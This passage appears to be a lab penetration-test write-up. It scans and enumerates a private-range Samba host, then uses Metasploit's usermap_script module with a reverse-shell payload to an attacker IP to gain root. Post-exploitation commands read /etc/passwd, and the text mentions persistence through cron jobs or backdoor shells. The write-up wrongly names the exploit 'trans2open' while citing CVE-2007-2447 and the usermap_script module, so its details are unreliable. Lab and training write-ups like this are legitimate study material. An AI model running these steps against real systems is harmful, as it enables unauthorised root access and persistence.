Command:
nmap -sS -p 139 -sV -O 192.168.56.101

Results:
PORT    STATE SERVICE  VERSION
139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)

4. Enumeration

4.1 Enum4linux
Command:
enum4linux -a 192.168.56.101

Key Findings:
- Samba version: 3.0.20
- Shares detected: IPC$, ADMIN$, tmp
- Possible guest access to shares
- User accounts discovered

5. Exploitation

5.1 Exploit Used: Samba trans2open (CVE-2007-2447)
Metasploit Module: exploit/multi/samba/usermap_script

Steps:
1. Launch Metasploit:
   msfconsole

2. Search and select the exploit:
   use exploit/multi/samba/usermap_script

3. Configure the exploit:
   set RHOST 192.168.56.101
   set RPORT 139
   set PAYLOAD cmd/unix/reverse
   set LHOST 192.168.56.1  # Attacker's IP
   run

Result:
- A reverse shell was successfully obtained.
- Confirmed code execution as root.

6. Post-Exploitation

6.1 System Enumeration
Commands run:
whoami
uname -a
ifconfig
cat /etc/passwd

Findings:
- User: root
- Full control over the system
- Able to extract sensitive system files

6.2 Persistence Possibility
- Reverse shell persistence via cron jobs or backdoor shells can be established.
- Samba misconfiguration allows repeatable exploitation.

7. Remediation Recommendations
- Upgrade Samba to the latest secure version.
- Monitor logs for unusual activity on ports 139 and 445.

8. Conclusion
